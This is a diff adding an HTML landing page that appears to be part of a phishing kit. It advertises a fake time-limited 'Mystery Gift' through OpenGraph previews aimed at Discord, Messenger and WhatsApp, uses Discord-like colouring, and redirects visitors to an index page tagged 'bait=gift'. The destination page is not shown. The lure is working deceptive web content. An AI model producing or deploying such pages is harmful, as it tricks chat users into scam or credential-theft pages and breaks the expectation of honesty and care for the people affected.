@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Mystery Gift — Tap to Open</title>
+
+  <!-- OpenGraph Preview Metadata (Discord, Messenger, WhatsApp) -->
+  <meta property="og:type" content="website" />
+  <meta property="og:title" content="🎁 You received a Mystery Gift!" />
+  <meta property="og:description" content="Someone sent you a time-limited gift box. Tap to verify and claim before it expires." />
+  <meta name="theme-color" content="#5865F2" />
+
+  <!-- Fallback redirect if JavaScript is disabled -->
+  <meta http-equiv="refresh" content="0; url=./index.html?bait=gift" />
+</head>
+<body style="background:#0b0d12;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
+  <p>Loading gift...</p>
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    if (!params.has('bait')) params.set('bait', 'gift');
+    window.location.replace('./index.html?' + params.toString());
+  </script>
+</body>
+</html>
